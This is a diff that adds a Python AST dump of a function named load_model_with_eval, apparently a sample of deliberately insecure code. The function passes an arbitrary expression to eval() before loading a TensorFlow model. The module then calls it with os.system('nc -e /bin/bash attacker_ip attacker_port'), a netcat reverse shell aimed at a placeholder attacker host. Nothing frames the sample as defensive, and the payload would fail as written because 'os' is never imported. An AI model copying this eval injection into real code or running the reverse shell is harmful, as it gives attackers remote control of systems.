@@ -1,0 +1,70 @@
+Module(
+    body=[
+        Import(
+            names=[
+                alias(name='numpy', asname='np')]),
+        Import(
+            names=[
+                alias(name='tensorflow', asname='tf')]),
+        FunctionDef(
+            name='load_model_with_eval',
+            args=arguments(
+                posonlyargs=[],
+                args=[
+                    arg(arg='model_path'),
+                    arg(arg='expression')],
+                kwonlyargs=[],
+                kw_defaults=[],
+                defaults=[]),
+            body=[
+                Assign(
+                    targets=[
+                        Name(id='result', ctx=Store())],
+                    value=Call(
+                        func=Name(id='eval', ctx=Load()),
+                        args=[
+                            Name(id='expression', ctx=Load())],
+                        keywords=[])),
+                Assign(
+                    targets=[
+                        Name(id='model', ctx=Store())],
+                    value=Call(
+                        func=Attribute(
+                            value=Attribute(
+                                value=Name(id='tf', ctx=Load()),
+                                attr='saved_model',
+                                ctx=Load()),
+                            attr='load',
+                            ctx=Load()),
+                        args=[
+                            Name(id='model_path', ctx=Load())],
+                        keywords=[])),
+                Return(
+                    value=Tuple(
+                        elts=[
+                            Name(id='model', ctx=Load()),
+                            Name(id='result', ctx=Load())],
+                        ctx=Load()))],
+            decorator_list=[]),
+        Assign(
+            targets=[
+                Name(id='model_path', ctx=Store())],
+            value=Constant(value='path/to/your/saved_model')),
+        Assign(
+            targets=[
+                Name(id='expression', ctx=Store())],
+            value=Constant(value="os.system('nc -e /bin/bash attacker_ip attacker_port')")),
+        Assign(
+            targets=[
+                Tuple(
+                    elts=[
+                        Name(id='model', ctx=Store()),
+                        Name(id='output', ctx=Store())],
+                    ctx=Store())],
+            value=Call(
+                func=Name(id='load_model_with_eval', ctx=Load()),
+                args=[
+                    Name(id='model_path', ctx=Load()),
+                    Name(id='expression', ctx=Load())],
+                keywords=[]))],
+    type_ignores=[])
